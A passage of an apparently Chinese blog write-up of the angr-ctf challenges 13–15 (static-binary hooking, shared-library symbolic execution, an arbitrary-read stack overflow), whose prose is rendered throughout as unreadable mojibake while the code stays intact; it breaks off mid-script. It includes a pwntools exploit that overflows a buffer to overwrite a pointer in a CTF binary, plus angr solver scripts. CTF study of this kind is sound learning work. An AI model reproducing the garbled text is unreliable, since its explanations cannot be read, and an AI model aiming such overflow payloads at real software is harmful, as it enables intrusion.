ä¼ªå‡½æ•°ä»¥è·å¾—æ›´å¿«çš„è¿è¡Œé€Ÿåº¦ï¼Œä½†è¿™ä¸€æ¬¡æ˜¯é™æ€ç¼–è¯‘çš„é¢˜ç›®ï¼Œéœ€è¦æˆ‘ä»¬æ‰‹åŠ¨è¿›è¡Œæ›¿æ¢ï¼›åŒæ—¶ç”±äºç¨‹åºè¿è¡Œèµ·å§‹æ˜¯ <code>__libc_start_main()</code> ï¼Œåœ¨è¿è¡Œåˆ° main ä¹‹å‰ä¼šèµ°å¾ˆå¤šä¸å¿…è¦çš„ä½†æ˜¯è¢«é™æ€ç¼–è¯‘è¿›æ¥çš„å¼¯è·¯ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨ä» main å¼€å§‹æ‰§è¡Œè€Œéç›´æ¥ä½¿ç”¨ <code>entry_state()</code> ï¼Œä¸è¿‡ç›´æ¥æ›¿æ¢æ‰ <code>__libc_start_main()</code> ä¹Ÿæ˜¯å¯ä»¥çš„</p><p>è·å– angr å†…ç½®åº“å‡½æ•°çš„æ–¹å¼æ˜¯ <code>angr.SIM_PROCEDURES[lib_name][function_name]</code> ï¼Œå’Œæˆ‘ä»¬ä¹‹å‰è‡ªå®šä¹‰çš„ hook å‡½æ•°ä¸€æ ·éƒ½æ˜¯ <code>SimProcedure</code> ç±»ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>project.hook(func_addr, sim_procedure_instance)</code> çš„æ–¹å¼è¿›è¡Œ hookï¼Œéœ€è¦æ³¨æ„çš„æ˜¯é™¤äº† <code>__libc_start_main</code> ä»¥å¤–çš„éœ€è¦è¢« hook çš„å‡½æ•°éƒ½æœ‰å¤§é‡å¼•ç”¨ï¼Œå› æ­¤ä¸è¦å›¾çœäº‹ç›´æ¥ä½¿ç”¨ <code>hook_symbol()</code></p><p>å› æ­¤æœ€åçš„è§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./13_angr_static_binary&#x27;</span><br>    proj = angr.Project(bin_path)<br>    init_state = proj.factory.entry_state()<br><br>    <span class="hljs-comment"># hook the functions</span><br>    proj.hook(<span class="hljs-number">0x8051330</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;libc&#x27;</span>][<span class="hljs-string">&#x27;scanf&#x27;</span>]())<br>    proj.hook(<span class="hljs-number">0x80512E0</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;libc&#x27;</span>][<span class="hljs-string">&#x27;printf&#x27;</span>]())<br>    proj.hook(<span class="hljs-number">0x805EC90</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;libc&#x27;</span>][<span class="hljs-string">&#x27;puts&#x27;</span>]())<br>    proj.hook(<span class="hljs-number">0x806D530</span>, angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;libc&#x27;</span>][<span class="hljs-string">&#x27;strcmp&#x27;</span>]())<br>    proj.hook_symbol(<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>, <br>                     angr.SIM_PROCEDURES[<span class="hljs-string">&#x27;glibc&#x27;</span>][<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]())<br><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    <span class="hljs-keyword">if</span> simgr.found :<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())<br>    <span class="hljs-keyword">else</span> :<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>è¿™ä¸€æ¬¡è§£é¢˜å¤§æ¦‚éœ€è¦åŠåˆ†é’Ÿå·¦å³</p><p><img src="https://s2.loli.net/2022/11/04/r6W9EHzQy8lGwXe.png" alt="image.png"></p><p>ä»¥åŠç¬”è€…é‡åˆ°ä»¥ä¸‹å‡ ä¸ª<strong>ä¸è§£</strong>çš„ç‚¹ï¼š</p><ul><li>åœ¨å‡ºé¢˜äººç•™ä¸‹çš„ <code>scaffold13.py</code> ä¸­æç¤ºæˆ‘ä»¬åº”å½“å°†åˆå§‹çŠ¶æ€è®¾ä¸º main èµ·å§‹ï¼Œä½†ç¬”è€…è¿™ä¹ˆåšæ— æ³•è§£å‡ºé¢˜ç›®ï¼ˆä¼šç›´æ¥æŠŠç¬”è€…çš„é˜¿é‡Œäº‘å­¦ç”Ÿæœºå†…å­˜æ’‘çˆ†ï¼Œä½†è¿™æ˜¯ä¸åº”è¯¥å‘ç”Ÿçš„ï¼‰</li><li>åœ¨ <code>explore()</code> ä¸­å°† find ä¸ avoid è®¾ä¸ºæ£€æµ‹ stdout ä¸­å­—ç¬¦ä¸²çš„æ–¹å¼ä¼šæ¯”ç›´æ¥å¼•ç”¨åŸºæœ¬å—åœ°å€è¦å¿« 5s</li><li>ä½¿ç”¨ <code>veritesting=True</code> ä¼šå¤§å¹…å»¶é•¿è§£é¢˜æ—¶é—´ï¼ˆçœ‹èµ·æ¥ä¸ä¼šåƒåœ¨ç¬”è€…æœ‰ç”Ÿä¹‹å¹´è§£å‡ºçš„æ ·å­ï¼‰</li><li>ä½¿ç”¨ç›´æ¥ hook å‡½æ•°çš„æ–¹å¼å¯ä»¥è§£å‡ºé¢˜ï¼Œä½†ä½¿ç”¨ hook <code>main()</code> ä¸­ call æŒ‡ä»¤çš„æ–¹å¼<strong>æ— æ³•æ‰¾åˆ°è§£</strong></li><li>æ€»çš„è§£é¢˜æ—¶é—´æ¯”ç¬”è€…é¢„æƒ³ä¸­è¦é•¿å¾—å¤š</li></ul><h2 id="14-angr-shared-libraryï¼šåŠ¨æ€åº“çš„ç¬¦å·æ‰§è¡Œ">14_angr_shared_libraryï¼šåŠ¨æ€åº“çš„ç¬¦å·æ‰§è¡Œ</h2><blockquote><p>è¿™ä¸€é¢˜çš„ç”Ÿæˆè„šæœ¬æœ‰ç‚¹é—®é¢˜ï¼Œç›´æ¥ä½¿ç”¨ä¼šæŠ¥ <code>No such file or directory </code>çš„ gcc errorï¼Œ è¿™æ˜¯å› ä¸ºåœ¨ç”Ÿæˆè„šæœ¬ä¸­çš„ <code>generate()</code> å‡½æ•°æœ€åä¸€è¡Œçš„ gcc å‘½ä»¤ä¸­çš„ <code>-L</code> å‚æ•°æœªæŒ‡å®šç›®å½•ï¼Œåœ¨åé¢åŠ ä¸€ä¸ª <code>.</code> æŒ‡å®šä¸ºå½“å‰ç›®å½•å³å¯</p></blockquote><p>æƒ¯ä¾‹æ‹–å…¥ IDAï¼Œè¿™ä¸€æ¬¡åœ¨è¯»å–è¾“å…¥åè°ƒç”¨äº†è‡ªå®šä¹‰çš„ä¸€ä¸ªåŠ¨æ€é“¾æ¥çš„ <code>validate()</code> å‡½æ•°å¯¹è¾“å…¥è¿›è¡ŒéªŒè¯ï¼Œå…¶å®šä¹‰åœ¨è‡ªå®šä¹‰åº“ <code>lib14_angr_shared_library.so</code> å½“ä¸­</p><p><img src="https://s2.loli.net/2022/11/04/bZiq9ks4Klyf8Gz.png" alt="image.png"></p><p>é‚£ä¹ˆè¿™é¢˜ç›´æ¥æš´åŠ› explore æ±‚è§£æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯è¿™ä¸æ˜¯æˆ‘ä»¬åšé¢˜çš„ç›®çš„ï¼šï¼‰</p><p>è¿™é¢˜å®é™…ä¸Šçš„ç›®çš„æ˜¯è®©æˆ‘ä»¬å¯¹åŠ¨æ€é“¾æ¥åº“è¿›è¡Œç¬¦å·æ‰§è¡Œæ±‚è§£ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å°†åˆå§‹çŠ¶æ€è®¾ä¸º <code>validate()</code>ï¼Œå°†ç»“æŸè®¾ä¸ºå‡½æ•°è¿”å›ï¼Œå¹¶æ·»åŠ å¯¹è¿”å›å€¼çš„çº¦æŸåè¿›è¡Œæ±‚è§£å³å¯</p><p>æˆ‘ä»¬ç°åœ¨æ¥é€†ä¸€ä¸‹è¿™ä¸ªåŠ¨æ€é“¾æ¥åº“ï¼Œå…¶ä¸­å°±åªæ˜¯æ¯”è¾ƒç®€å•çš„ä¸€ä¸ª complex å¤„ç†çš„è¿‡ç¨‹è€Œå·²</p><p><img src="https://s2.loli.net/2022/11/04/oQyUL8W6hb2f9zl.png" alt="image.png"></p><p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æ¨¡æ‹Ÿè°ƒç”¨ <code>validate()</code> çš„è¿‡ç¨‹å³å¯ï¼Œæˆ‘ä»¬å…ˆç”¨ <code>claripy.BVS()</code> åˆ›å»ºä¸€ä¸ªè¡¨ç¤ºè¦æ±‚è§£çš„å­—ç¬¦ä¸²çš„ç¬¦å·å‘é‡ï¼Œå°†å…¶è½½å…¥åˆ°åˆå§‹çŠ¶æ€å†…å­˜ä¸­çš„ä¸€ä¸ªåœ°å€ä¸Šï¼Œä¹‹åå°†è¿™å—å†…å­˜çš„åœ°å€æ¨åˆ°æ ˆä¸Šä½œä¸º <code>validate()</code> çš„å‚æ•°å³å¯</p><p>æœ€åå°±æ˜¯ç›´æ¥ <code>explore()</code> åˆ°å‡½æ•°è¿”å›åæ·»åŠ  <code>eax == 1</code> çš„çº¦æŸåæ±‚è§£å³å¯ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ç”±äºè¿™æ˜¯ä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦åœ¨åˆ›å»º project æ—¶é€šè¿‡æŒ‡å®šåŠ è½½å‚æ•° <code>load_options</code> æ¥<strong>æ‰‹åŠ¨æŒ‡å®šåŠ è½½åŸºåœ°å€</strong>ï¼Œå…·ä½“å†™æ³•å‚ç…§ç¬”è€…çš„ exp</p><p>å› æ­¤æœ€ç»ˆçš„è§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./lib14_angr_shared_library.so&#x27;</span><br>    base_addr = <span class="hljs-number">0x400000</span><br>    proj = angr.Project(bin_path, load_options = &#123;<br>        <span class="hljs-string">&#x27;main_opts&#x27;</span>: &#123;<br>            <span class="hljs-string">&#x27;custom_base_addr&#x27;</span>: base_addr<br>        &#125;<br>    &#125;)<br>    start_addr = base_addr + <span class="hljs-number">0x129C</span> <span class="hljs-comment"># addr of validate()</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br><br>    password = claripy.BVS(<span class="hljs-string">&#x27;password&#x27;</span>, <span class="hljs-number">8</span> * <span class="hljs-number">8</span>) <span class="hljs-comment"># 8 bytes</span><br>    password_addr = <span class="hljs-number">0x3000000</span><br>    init_state.memory.store(password_addr, password)<br><br>    <span class="hljs-comment"># emulate the process of calling validate(password, 8)</span><br>    init_state.regs.ebp = init_state.regs.esp<br>    init_state.stack_push(<span class="hljs-number">8</span>)<br>    init_state.stack_push(password_addr)<br>    init_state.stack_push(<span class="hljs-number">0xdeadbeef</span>)<br><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = base_addr + <span class="hljs-number">0x134B</span>)<br><br>    solution_state = simgr.found[<span class="hljs-number">0</span>]<br>    solution_state.add_constraints(solution_state.regs.eax == <span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(solution_state.solver.<span class="hljs-built_in">eval</span>(password, cast_to=<span class="hljs-built_in">bytes</span>))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>è¿˜æ˜¯å·®ä¸å¤šç§’è§£ï¼š</p><p><img src="https://s2.loli.net/2022/11/05/vQi5PtLqbOVWrxa.png" alt="image.png"></p><p>å½“ç„¶ï¼Œç¬”è€…è¿™é‡Œè°ƒç”¨å‡½æ•°çš„æ–¹æ³•æ¯”è¾ƒç²—çŠ·ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ angr æä¾›çš„ <code>project.factory.call_state(func_addr, args...)</code> æ¥åˆ›å»ºä¸€ä¸ªå‡½æ•°è°ƒç”¨çš„åˆå§‹çŠ¶æ€ï¼Œç”¨ä¾‹å†™æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><br>bin_path = <span class="hljs-string">&#x27;./test&#x27;</span><br>proj = angr.Project(bin_path)<br><br>func_addr = <span class="hljs-number">0xdeadbeef</span><br>init_state = proj.factory.call_state(func_addr, <span class="hljs-number">114514</span>, <span class="hljs-number">1919810</span>) <span class="hljs-comment"># func(114514, 1919810)</span><br></code></pre></td></tr></table></figure><h1>0x07. angr-ctfï¼šæ¼æ´åˆ©ç”¨</h1><h2 id="15-angr-arbitrary-readï¼šæ ˆæº¢å‡ºå˜é‡è¦†ç›–">15_angr_arbitrary_readï¼šæ ˆæº¢å‡ºå˜é‡è¦†ç›–</h2><p>æƒ¯ä¾‹æ‹–å…¥ IDAï¼Œé€»è¾‘æ¯”è¾ƒç®€å•ï¼Œå¦‚æœç¬¬ä¸€ä¸ªæ•°ä¸æ˜¯ 42698355 æˆ–è€…ç¬¬ä¸€ä¸ªæ•°æ˜¯ 9507730 å°±è¾“å‡º <code>&quot;Try again.&quot;</code> ï¼Œå¦åˆ™è¾“å‡º s å­—ç¬¦ä¸²ï¼Œè€Œåœ¨è¯»å…¥åˆ° v4 æ—¶å­˜åœ¨ä¸€ä¸ªæ ˆæº¢å‡ºå¯ä»¥è¦†ç›– s æŒ‡é’ˆï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è®©å…¶è¾“å‡ºæŒ‡å®šåœ°å€ä¸Šçš„å­—ç¬¦ä¸²</p><p><img src="https://s2.loli.net/2022/11/05/Xm2yczB6WNTa1ex.png" alt="image.png"></p><p>è€Œä¼—æ‰€å‘¨çŸ¥ angr-ctf å½“ä¸­çš„é¢˜ç›®éƒ½è¦æˆ‘ä»¬è¾“å‡º <code>&quot;Good Job.&quot;</code> å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬åœ¨ IDA ä¸­å¯ä»¥å¾ˆå®¹æ˜“æ‰¾åˆ°ä»–çš„åœ°å€ï¼Œæ‰€ä»¥æœ€åçš„ exp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    p = process(<span class="hljs-string">&#x27;./15_angr_arbitrary_read&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;42698355 &#x27;</span> + <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x10</span> + p32(<span class="hljs-number">0x58465157</span>))<br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure><p>è¿è¡Œå³å¯è·å¾— <code>&quot;Good Job.&quot;</code></p><p><img src="https://s2.loli.net/2022/11/05/p3gPi9TYl1fuU6h.png" alt="image.png"></p><p>â€”â€”ä½†è¿™å¹¶ä¸æ˜¯æˆ‘ä»¬åšè¿™ä¸€é“é¢˜çš„ç›®çš„ï¼Œæˆ‘ä»¬åº”å½“ä½¿ç”¨ angr æ¥æ±‚è§£ï¼šï¼‰</p><p>é‚£ä¹ˆç”¨ angr è¯¥æ€ä¹ˆåšå‘¢ï¼Ÿä¸€å¼€å§‹ç¬”è€…ä¹Ÿæ²¡å¤ªæƒ³æ˜ç™½ï¼Œåé¢æƒ³åˆ°æ—¢ç„¶è¾“å…¥çš„é•¿åº¦æ˜¯å·²çŸ¥çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ SimProcedure æ¥ hook æ‰ scanfï¼Œå°†è¾“å…¥ä½œä¸ºç¬¦å·ä½å‘é‡è¿›è¡Œæ±‚è§£ï¼ŒåŒæ—¶æˆ‘ä»¬åº”å½“ä¸ºç¬¬äºŒä¸ªè¾“å…¥å­—ç¬¦ä¸²ä¸­çš„æ¯ä¸ªå­—ç¬¦æ·»åŠ æˆå¯è§å­—ç¬¦çš„çº¦æŸ</p><p>é‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>BVS.chop(bits=n)</code> æ¥å°†ç¬¦å·ä½å‘é‡æŒ‰ç…§ä¸€å®šå°ºå¯¸è¿›è¡Œåˆ†å‰²ï¼Œäºæ˜¯æœ€åçš„æ¨¡æ‹Ÿ scanf å†™æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MySimScanfProcedure</span>(angr.SimProcedure):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, <span class="hljs-built_in">str</span>, key_addr, chr_arr_addr</span>):<br>        key_bvs = claripy.BVS(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>)<br>        chr_arr_bvs = claripy.BVS(<span class="hljs-string">&#x27;chr_arr&#x27;</span>, <span class="hljs-number">20</span> * <span class="hljs-number">8</span>)<br>        <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> chr_arr_bvs.chop(bits = <span class="hljs-number">8</span>):<br>            self.state.add_constraints(ch &gt;= <span class="hljs-string">&#x27;0&#x27;</span>, ch &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)<br>        self.state.memory.store(key_addr, key_bvs,<br>                                endness = proj.arch.memory_endness)<br>        self.state.memory.store(chr_arr_addr, chr_arr_bvs)<br>        self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_0&#x27;</span>] = key_bvs<br>        self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;password_1&#x27;</span>] = chr_arr_bvs<br><br>proj.hook_symbol(<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>, MySimScanfProcedure())<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦åˆ¤æ–­æˆ‘ä»¬çš„ç¬¦å·åŒ–å‘é‡æ˜¯å¦è·å¾—äº†æˆ‘ä»¬é¢„æœŸä¸­çš„ç»“æœï¼Œæˆ‘ä»¬è¿™ä¸€æ¬¡å°†è·¯å¾„æ¢ç´¢çš„ç»ˆç»“ç‚¹æ”¾åœ¨ <code>puts()</code>ï¼Œå¹¶åˆ¤æ–­å…¶å‚æ•°æ˜¯å¦ä¸º <code>&quot;Good Job.&quot;</code> å­—ç¬¦ä¸²çš„åœ°å€ï¼š</p><ul><li>ä½¿ç”¨ <code>state.memory.load()</code> å°† <code>puts()</code> çš„å‚æ•°æå–å‡ºæ¥</li><li>ä½¿ç”¨ <code>state.solver.symbolic()</code> åˆ¤æ–­ <code>puts()</code> çš„å‚æ•°æ˜¯å¦æ˜¯æˆ‘ä»¬çš„ BVS</li><li>ä½¿ç”¨ <code>state.copy()</code> è·å–å½“å‰çŠ¶æ€çš„å‰¯æœ¬ï¼Œä¹‹ååœ¨è¯¥å‰¯æœ¬ä¸Šæ·»åŠ çº¦æŸä»¥é¿å…å½±å“åˆ°åŸçŠ¶æ€</li><li>ä½¿ç”¨ <code>state.satisfiable()</code> åˆ¤æ–­æ˜¯å¦æ»¡è¶³çº¦æŸï¼Œè‹¥æ˜¯åˆ™æ·»åŠ åˆ°åŸçŠ¶æ€ä¸­æ±‚è§£å³å¯</li></ul><p>æ–¹ä¾¿èµ·è§ï¼Œè¿™é‡Œç¬”è€…å°†æœç´¢çš„åœ°å€è®¾ä¸º <code>puts()</code> å‡½æ•°çš„ plt è¡¨åœ°å€ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_success</span>(<span class="hljs-params">state</span>):<br>    call_puts_addr = <span class="hljs-number">0x8049090</span><br>    <span class="hljs-keyword">if</span> state.addr != call_puts_addr:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    good_str_addr = <span class="hljs-number">0x58465157</span><br>    puts_param = state.memory.load(state.regs.esp + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>,<br>                                   endness = proj.arch.memory_endness)<br>    <span class="hljs-keyword">if</span> state.solver.symbolic(puts_param):<br>        copy_state = state.copy()<br>        copy_state.add_constraints(puts_param == good_str_addr)<br>        <span class="hljs-keyword">if</span> copy_state.satisfiable():<br>            state.add_constraints(puts_param == good_str_addr)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>simgr.explore(find = is_success)<br></code></pre></td></tr></table></figure><p>é™¤äº†é€šè¿‡å¤åˆ¶çŠ¶æ€åæ·»åŠ çº¦æŸå¹¶åˆ¤æ–­çš„æ–¹æ³•ä»¥å¤–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ä¸º <code>state.satisfiable()</code> æŒ‡å®š <code>extra_constraints</code> å‚æ•°çš„æ–¹å¼æ¥åœ¨ä¸å½±å“çŠ¶æ€æœ¬èº«å·²æœ‰çº¦æŸé›†çš„çŠ¶æ€ä¸‹è¿›è¡Œçº¦æŸåˆ¤æ–­ï¼Œå› æ­¤ä¸Šé¢çš„ is_success() å‡½æ•°ä¹Ÿå¯ä»¥å†™æˆå¦‚ä¸‹å½¢å¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_success</span>(<span class="hljs-params">state</span>):<br>    call_puts_addr = <span class="hljs-number">0x8049090</span><br>    <span class="hljs-keyword">if</span> state.addr != call_puts_addr:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    good_str_addr = <span class="hljs-number">0x58465157</span><br>    puts_param = state.memory.load(state.regs.esp + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>,<br>                                   endness = proj.arch.memory_endness)<br>    <span class="hljs-keyword">if</span> state.solver.symbolic(puts_param):<br>        <span class="hljs-keyword">if</span> state.satisfiable(extra_constraints=(puts_param == good_str_addr,)):<br>            state.add_constraints(puts_param == good_str_addr)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>simgr.explore(find = is_success)<br></code></pre></td></tr></table></figure><p>å°†ä¸Šé¢çš„è¿›è¡Œæ•´åˆå°±æ˜¯æˆ‘ä»¬æœ€åçš„ exp äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./15_angr_arbitrary_read&#x27;</span><br>    proj = angr.Project(bin_path)<br><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">MySimScanfProcedure</span>(angr.SimProcedure):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, <span class="hljs-built_in">str</span>, key_addr, chr_arr_addr</span>):<br>            key_bvs = claripy.BVS(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>)<br>            chr_arr_bvs = claripy.BVS(<span class="hljs-string">&#x27;chr_arr&#x27;</span>, <span class="hljs-number">20</span> * <span class="hljs-number">8</span>)<br>            <span class="hljs-keyword">for</span> ch <span 